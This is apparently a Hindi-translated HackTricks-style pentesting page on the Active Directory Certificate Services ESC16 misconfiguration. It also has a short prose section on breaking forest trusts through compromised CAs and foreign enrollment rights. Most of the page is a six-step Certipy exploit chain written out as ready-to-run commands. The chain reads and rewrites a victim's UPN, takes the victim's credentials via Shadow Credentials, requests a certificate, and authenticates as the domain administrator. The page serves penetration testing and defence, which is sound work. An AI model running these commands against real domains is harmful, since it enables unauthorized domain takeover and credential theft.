**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** का मतलब उस स्थिति से है जहाँ, यदि Active Directory Certificate Services (AD CS) की configuration सभी certificates में **szOID_NTDS_CA_SECURITY_EXT** extension को शामिल करने को बाध्य नहीं करती, तो एक attacker इसका शोषण कर सकता है:

1. एक certificate का अनुरोध करना **without SID binding**।

2. इस certificate का उपयोग **for authentication as any account** के लिए करना, जैसे कि किसी उच्च-privilege अकाउंट (उदा., Domain Administrator) के रूप में impersonate करना।

आप अधिक विवरणात्मक सिद्धांत जानने के लिए इस article को भी देख सकते हैं: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### दुरुपयोग

निम्न [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) में संदर्भित है, अधिक विस्तृत उपयोग विधियाँ देखने के लिए क्लिक करें।

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के लिए vulnerable है या नहीं
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**कदम 1: लक्षित खाते का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापना के लिए).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: पीड़ित खाते का UPN लक्षित प्रशासक के `sAMAccountName` के अनुरूप अपडेट करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "victim" खाते के लिए credentials प्राप्त करें (उदा., Shadow Credentials के माध्यम से).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA पर _any suitable client authentication template_ (e.g., "User") से "victim" user के रूप में एक certificate request करें।** CA ESC16 के लिए vulnerable होने के कारण, जारी किए गए certificate से SID security extension को यह स्वतः हटा देगा, भले ही template की specific settings इस extension के लिए कुछ भी हों। Set the Kerberos credential cache environment variable (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
फिर प्रमाणपत्र का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**चरण 5: "victim" खाता का UPN पूर्ववत करें.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**चरण 6: लक्षित प्रशासक के रूप में प्रमाणीकृत करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## प्रमाणपत्रों द्वारा फॉरेस्ट का समझौता — Passive Voice में समझाया गया

### Compromised CAs द्वारा फॉरेस्ट ट्रस्ट्स का टूटना

The configuration for **cross-forest enrollment** अपेक्षाकृत सरल बनाई जाती है। resource forest से **root CA certificate** administrators द्वारा **account forests में प्रकाशित** किया जाता है, और resource forest के **enterprise CA** certificates प्रत्येक account forest में `NTAuthCertificates` और AIA containers में **जोड़े** जाते हैं। स्पष्ट करने के लिए, यह व्यवस्था resource forest के **CA** को उन सभी अन्य फॉरेस्ट्स पर पूर्ण नियंत्रण देती है जिनके लिए यह **PKI** प्रबंधित करता है। यदि इस CA को attackers द्वारा **compromised** किया जाता है, तो resource और account दोनों फॉरेस्ट्स के सभी उपयोगकर्ताओं के लिए certificates उनके द्वारा **forged** किए जा सकते हैं, और इस प्रकार फॉरेस्ट की सुरक्षा सीमा तोड़ी जा सकती है।

### Enrollment Privileges Granted to Foreign Principals

multi-forest environments में, उन Enterprise CAs के मामले में सावधानी आवश्यक है जो **publish certificate templates** करते हैं जो **Authenticated Users या foreign principals** (उस फॉरेस्ट के बाहरी users/groups जिनके लिए Enterprise CA संबंधित है) को **enrollment और edit rights** की अनुमति देते हैं.\
trust के पार authentication होने पर, AD द्वारा उपयोगकर्ता के token में **Authenticated Users SID** जोड़ा जाता है। इसलिए, यदि किसी domain के पास ऐसा Enterprise CA है जिसमें एक template है जो **Authenticated Users को enrollment rights देता है**, तो वह template संभवतः किसी अन्य फॉरेस्ट के उपयोगकर्ता द्वारा **enrolled** किया जा सकता है। इसी तरह, यदि किसी template द्वारा स्पष्ट रूप से किसी foreign principal को **enrollment rights** दिए जाते हैं, तो इससे एक **cross-forest access-control relationship** बन जाती है, जिससे एक फॉरेस्ट का प्रिंसिपल दूसरे फॉरेस्ट के template में **enroll** कर सकता है।

दोनों परिदृश्य एक फॉरेस्ट से दूसरे फॉरेस्ट तक **attack surface** में वृद्धि की ओर ले जाते हैं। certificate template की settings का एक attacker द्वारा शोषण करके किसी foreign domain में अतिरिक्त privileges प्राप्त किए जा सकते हैं।

## संदर्भ

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
